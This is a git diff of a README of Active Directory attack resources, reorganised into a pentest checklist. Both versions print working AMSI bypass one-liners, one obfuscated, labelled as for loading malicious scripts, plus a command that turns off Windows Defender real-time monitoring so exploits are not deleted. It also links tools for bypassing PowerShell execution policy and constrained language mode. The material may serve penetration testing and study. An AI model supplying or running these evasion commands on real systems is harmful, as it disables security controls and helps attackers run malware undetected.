@@ -1,44 +1,39 @@
 # AD-Security-Resources
 
-Bypass Execution Policy : 
-https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
+<p><h2>Setting up active directory lab :</h2>
+<p>https://github.com/outflanknl/Invoke-ADLabDeployer 
 
-Huge list of AD security resources available below :
-  https://adsecurity.org/
-  https://www.harmj0y.net/
-  https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
-  https://beta.hackndo.com/
+<p><h2>Local Computer Enumeration and Privesc : </h2>
 
+<p>1. Bypass Execution Policy : 
 
-Setting up active directory lab :  https://github.com/outflanknl/Invoke-ADLabDeployer 
+<p>One of the 15 methods mentioned in the blog usually works.. </p>
+<p>https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
 
-Bypassing Powershell execution policy issues : </H2>
-
-Github links - AMSI Bypass for loading malicious scripts:
-  <p>  https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell </p>
-  Something that works quickly 
-  <p>   sETItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} ) </p>
-
-This works !!!
-(Thanks - https://burmat.gitbook.io/security/hacking/domain-exploitation#user-and-computers-with-unconstrained-delegation)
-[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
-
-Detailed Article on this subject : https://blog.f-secure.com/hunting-for-amsi-bypasses/
+<u>Notes :</u> Bypassing Powershell execution policy issues : </H2>
 
 
-Constrained Language Mode : 
+<p>2. AMSI Bypass for loading malicious scripts:
+<p>  https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell </p>
+<u>Few scripts that usually works quickly </u>
+<p>sETItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} ) </p>
+
+<p>[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)</p>
+
+<u>Detailed Article on this subject : </u>
+https://blog.f-secure.com/hunting-for-amsi-bypasses/
+https://burmat.gitbook.io/security/hacking/domain-exploitation#user-and-computers-with-unconstrained-delegation
+
+<p>3. Constrained Language Mode :</p> 
 Constrained Language consists of a number of restrictions that limit unconstrained code execution on a locked-down system.  (https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)
 
-Check the below for bypassing this 
 https://github.com/padovah4ck/PSByPassCLM
 https://chickenpwny.github.io/concepts/bypass/
 
-
-
-Turning of Windows Defender - Real Time Monitoring (for not letting exploits to be deleted):
+<p>4. Turning of Windows Defender - Real Time Monitoring (for not letting exploits to be deleted):
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-<H2> Recon of active directory objects :</h2>
+<H2>5.  Domain Enumeration</h2>
 <p>PowerView / Powersploit: https://github.com/PowerShellMafia/PowerSploit</p>
 
 <p><h3>ACL Enumeration and escalation :</h3></p>
@@ -84,4 +79,9 @@ Pingcastle - AD Security :
   https://github.com/vletoux/pingcastle
 
 
+Huge list of AD security resources available below :
+  https://adsecurity.org/
+  https://www.harmj0y.net/
+  https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
+  https://beta.hackndo.com/
 
